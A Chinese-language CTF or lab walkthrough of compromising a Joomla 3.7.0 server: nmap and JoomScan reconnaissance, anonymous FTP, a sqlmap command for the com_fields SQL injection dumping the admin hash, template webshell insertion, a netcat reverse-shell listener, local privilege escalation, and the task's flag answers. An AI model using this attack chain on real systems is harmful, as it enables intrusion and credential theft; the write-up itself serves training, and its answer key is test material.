---

title: PY-WEB-某B任务6
date: 2021-09-26 21:45:24
categories: 网络安全
tags:
      - 中科磐云	
      - WEB
      - B模块
---

> WEB地址 ： vul.fly128.top:8055 	原内网地址：192.168.100.8:80

# B-6任务六：Web安全应用

## 0x01-信息收集

先上 nmap

```bash
┌──(root💀kali)-[~]
└─# nmap -sV 192.168.100.8 -O -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 05:55 CST
Nmap scan report for 192.168.100.8
Host is up (0.00070s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 52:54:00:E2:23:34 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
```

然后看下   **WEB框架 ** 发现是 **Joomla**

{% asset_img 01.png %}

## 0x02-漏洞利用

> 前面看到 开启了一个 FTP的服务 先匿名登录一下试试

### 下载文件

```bash
┌──(root💀kali)-[~]
└─# ftp 192.168.100.8
Connected to 192.168.100.8.
220 (vsFTPd 3.0.3)
Name (192.168.100.8:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 May 02 09:52 uploadFile
226 Directory send OK.
ftp>

ftp> cd uploadFile
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           91324 May 02 09:52 joomscan-master.zip
-rw-r--r--    1 0        0            5776 May 02 09:51 upstream44.c
226 Directory send OK.
ftp>
```

登录成功 发现有一个 **文件夹** 里面有个 **压缩包** 和一个 **C 文件** 先 **GET** 下来 

{% asset_img 02.png %}

发现这玩意是专门扫描 **Joomla** 的 emmm ！！！

先解压看看

{% asset_img 03.png %}

直接用这个扫描一下 WEB 站点

```bash
┌──(root💀kali)-[~/192.168.100.8_FTP/joomscan-master]
└─# perl joomscan.pl -u http://192.168.100.8/
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.100.8/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.100.8/administrator/components
http://192.168.100.8/administrator/modules
http://192.168.100.8/administrator/templates
http://192.168.100.8/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.100.8/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.100.8/robots.txt

Interesting path found from robots.txt
http://192.168.100.8/joomla/administrator/
http://192.168.100.8/administrator/
http://192.168.100.8/bin/
http://192.168.100.8/cache/
http://192.168.100.8/cli/
http://192.168.100.8/components/
http://192.168.100.8/includes/
http://192.168.100.8/installation/
http://192.168.100.8/language/
http://192.168.100.8/layouts/
http://192.168.100.8/libraries/
http://192.168.100.8/logs/
http://192.168.100.8/modules/
http://192.168.100.8/plugins/
http://192.168.100.8/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/192.168.100.8/
```

扫描结果 Joomla 版本为 Joomla 3.7.0

### 搜索漏洞利用模块

```bash
┌──(root💀kali)-[~/192.168.100.8_FTP/joomscan-master]
└─# searchsploit joomla 3.7
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                                                                | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                 | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                           | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - SQL Injection                                | php/webapps/38445.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                              | php/webapps/43488.txt
Joomla! Component J2Store < 3.3.7 - SQL Injection                                          | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - 'id' SQL Injection                                   | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download                   | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                                        | php/webapps/42589.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

有个 SQL 注入 php/webapps/42033.txt 

> 这个路径 之前在 /usu/local/opt/exp 下 新版改路径了  不确定先find查找 下 把里面的 payload 复制出来 直接爆库



```bash
┌──(root💀kali)-[~/192.168.100.8_FTP/joomscan-master]
└─# cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
```

**Payload**

```bash
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

替换直接使用就行 爆出 后台 **用户 密码** 

```bash
sql-shell> select username,password from joomla.#__users
[06:25:19] [INFO] fetching SQL SELECT statement query output: 'select username,password from joomla.#__users'
[06:25:19] [INFO] retrieved: 'admin'
[06:25:20] [INFO] retrieved: '$2y$10$UI/eNzVj3QoFqxq8yVG2p.lc4jBfRJgcRqGGaoHBaq2JvRh4h3//y'
select username,password from joomla.#__users [1]:
[*] admin, $2y$10$UI/eNzVj3QoFqxq8yVG2p.lc4jBfRJgcRqGGaoHBaq2JvRh4h3//y
```

### 后台密码破解

{% asset_img 04.png %}

{% asset_img 05.png %}

### 登录后台写马

{% asset_img 06.png %}

{% asset_img 07.png %}

{% asset_img 08.png %}

> 插入木马的模板一定是当前的使用的模板 这个要注意

### 反弹shell

> 连接蚁剑 或 菜刀 反弹 shell 

{% asset_img 09.png %}

Kali 监听 4444 

```bash
┌──(root💀kali)-[~/192.168.100.8_FTP]
└─# nc -lvp 4444                                                                            1 ⚙
listening on [any] 4444 ...
```

{% asset_img 10.png %}

### 提权

> 上面发现当前是 www-data 然后在 ftp 服务上 发现了 一个 C 文件 ，upstream44.c 是用来提权的。。。
>
> 这题真 **磐云** ！！！

先创建个临时文件夹把 upstream44.c 上传上去，然后在 gcc 编译 upstream44.c

```bash
# 编译
www-data@deny-KVM:/var/www/html/test$ gcc -o upstream44 upstream44.c

# 运行
www-data@deny-KVM:/var/www/html/test$ ./upstream44
```

{% asset_img 11.png %}

{% asset_img 12.png %}

## 0x03-收割Flag

### 1.获取PHP的版本号作为Flag值提交；（例如：5.2.14）

```
7.0.33 
```

### 2.获取MySQL数据库的版本号作为Flag值提交；（例如：5.0.22）

```
5.7.33
```

### 3.获取系统的内核版本号作为Flag值提交；（例如：2.6.18）

```
4.4.0-62-generic
```

### 4.获取网站后台管理员admin用户的密码作为Flag值提交；

```
admin
```

### 5.找到/root目录中的txt文件，将文件内容作为Flag值提交。

```
flag{joolmaFlag6}
```

## 0x04-总结

> 这很 **磐云** ！！！ CNM